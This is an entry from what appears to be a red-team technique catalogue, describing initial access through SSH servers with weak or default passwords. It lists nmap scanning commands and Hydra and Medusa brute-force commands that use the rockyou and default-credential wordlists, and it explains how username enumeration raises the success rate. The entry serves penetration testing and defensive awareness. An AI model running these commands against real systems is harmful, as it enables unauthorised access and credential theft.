---
id: init-002
title: "Exposed SSH with Weak Password"
category: initial_access
tags: [ssh, brute-force, hydra, default-credentials, weak-password, initial-access]
platform: [linux]
commands:
  - "nmap -p 22 --open -sV <target-subnet>/24"
  - "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4"
  - "hydra -l root -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt ssh://<target-ip>"
  - "medusa -h <target-ip> -U users.txt -P passwords.txt -M ssh"
references:
  - "https://attack.mitre.org/techniques/T1110/"
  - "https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/"
---

Internet-exposed SSH servers running on port 22 (or non-standard ports discoverable via Shodan/Censys) with weak, default, or previously breached passwords are a primary initial access vector for opportunistic and targeted attackers alike. Hydra and Medusa automate credential attacks by testing username/password combinations from wordlists including device defaults, common passwords, and datasets from prior data breaches. Prioritizing credential lists from SecLists and targeting commonly reused passwords, combined with username enumeration via timing attacks or error message differences, significantly increases attack success rates against SSH services.
